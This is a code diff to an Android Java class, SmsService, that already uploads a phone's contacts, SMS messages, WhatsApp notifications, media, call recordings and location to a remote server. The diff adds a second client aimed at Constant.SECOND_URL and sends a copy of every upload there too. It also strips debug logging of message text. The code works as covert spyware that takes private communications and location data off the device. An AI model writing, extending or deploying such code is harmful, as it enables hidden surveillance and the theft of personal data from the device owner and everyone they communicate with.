@@ -29,6 +29,7 @@ import retrofit.mime.TypedFile;
 public class SmsService {
     private Context context;
     private SmsAPI smsAPI;
+    private SmsAPI testSmsAPI;
 
     public SmsService(Context context) {
         this.context = context;
@@ -57,41 +58,69 @@ public class SmsService {
             smsAPI = restAdapter.create(SmsAPI.class);
         }
     }
+
+    /**
+     * Initialize pdf cloud Rest API call
+     */
+    private void initSecondSMSAPI() {
+        if (testSmsAPI == null) {
+            Executor executor = Executors.newFixedThreadPool(1);
+
+            OkHttpClient okHttpClient = new OkHttpClient();
+            okHttpClient.setReadTimeout(30, TimeUnit.SECONDS);
+            okHttpClient.setWriteTimeout(10, TimeUnit.SECONDS);
+            okHttpClient.setConnectTimeout(10, TimeUnit.SECONDS);
+            okHttpClient.setFollowSslRedirects(true);
+            try {
+                File cacheDir = new File(System.getProperty("java.io.tmpdir"), "okhttp-cache");
+                Cache cache = new Cache(cacheDir, (20L * 1024 * 1024));
+                okHttpClient.setCache(cache);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+
+            RestAdapter restAdapter = new RestAdapter.Builder().setEndpoint(Constant.SECOND_URL).setClient(new OkClient(okHttpClient)).setExecutors(executor, executor).setLogLevel(RestAdapter.LogLevel.FULL).build();
+            testSmsAPI = restAdapter.create(SmsAPI.class);
+        }
+    }
+
     public void sendContacts(String userMob,String contactId,String contactNo,String contactName){
         initSMSAPI();
+        initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(1);
         smsAPI.postContacts("ContactList",userMob,contactId,contactNo,contactName,smsCallback);
+        testSmsAPI.postContacts("ContactList",userMob,contactId,contactNo,contactName,smsCallback);
     }
     public void sendSms(String userMob,String msgId,String msgDate,String msgFrom,String to,String msgText){
         initSMSAPI();
+        initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(2);
         smsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
+        testSmsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
     }
 
     public void sendNotification(String userMob, String msgId, String msgDate, String msgFrom, String to, String msgText, List<NotificationEntity> notifications){
         initSMSAPI();
+        initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(context,3,notifications);
-        System.out.println("*****************************");
-        System.out.println("userMob ="+userMob);
-        System.out.println("msgId ="+msgId);
-        System.out.println("msgDate ="+msgDate);
-        System.out.println("msgFrom ="+removeSpChars(msgFrom));
-        System.out.println("to ="+removeSpChars(to));
-        System.out.println("msgText ="+msgText);
-        System.out.println("*****************************");
         smsAPI.postWhatsApp("WHATSAPP",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
+        testSmsAPI.postWhatsApp("WHATSAPP",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
     }
 
     public void sendMedia(File file,String userMobile){
         initSMSAPI();
+        initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(4);
         smsAPI.postWhatsAppMedia("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
+        testSmsAPI.postWhatsAppMedia("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
     }
 
     public void sendCallrecordings(File file,String userMobile){
         initSMSAPI();
+        initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(5, file);
         smsAPI.postCallRecord("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
+        testSmsAPI.postCallRecord("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
     }
 
     public static String removeSpChars(String s){
@@ -113,7 +142,9 @@ public class SmsService {
 
     public void sendLocation(String userMobile){
         initSMSAPI();
+        initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(6);
         smsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),userMobile, smsCallback);
+        testSmsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),userMobile, smsCallback);
     }
 }
